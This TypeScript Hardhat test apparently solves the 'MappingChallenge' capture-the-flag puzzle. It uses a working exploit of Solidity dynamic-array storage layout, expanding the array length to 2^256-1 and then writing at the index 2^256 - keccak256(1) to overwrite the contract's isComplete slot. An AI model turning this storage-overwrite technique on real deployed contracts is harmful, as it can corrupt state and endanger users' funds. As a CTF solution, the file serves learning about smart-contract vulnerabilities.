import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let contract: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory("MappingChallenge");
  contract = challengeFactory.attach(
    `0xc30168e1b42A81936EfAC8e88964E57a88735e13`
  );
});

it("solves the challenge", async function () {
  // all of contract storage is a 32 bytes key to 32 bytes value mapping
  // first make map expand its size to cover all of this storage by setting
  // key = 2^256 - 2 => map.length = 2^256 - 2 + 1 = 2^256 - 1 = max u256
  // this bypasses bounds checking
  tx = await contract.set(BigNumber.from(`2`).pow(`256`).sub(`2`), `0`);
  await tx.wait();

  // now try to index the map in a way such that write to the isComplete variable
  // > In the case of a dynamic array, the reserved slot contains the length
  // of the array as a uint256, and the array data itself is located sequentially
  // at the address keccak256(p).
  // https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout
  // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html#mappings-and-dynamic-arrays

  // map[0] value is stored at keccak(p) = keccak(1)
  // needs to be padded to a 256 bit
  const mapDataBegin = BigNumber.from(
    ethers.utils.keccak256(
      `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
  );
  console.log(`mapDataBegin`, mapDataBegin.toHexString());
  // need to find index at this location now that maps to 0 mod 2^256
  // i.e., 0 - keccak(1) mod 2^256 <=> 2^256 - keccak(1) as keccak(1) is in range
  const isCompleteOffset = BigNumber.from(`2`).pow(`256`).sub(mapDataBegin);

  tx = await contract.set(isCompleteOffset, `1`);
  await tx.wait();

  const isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
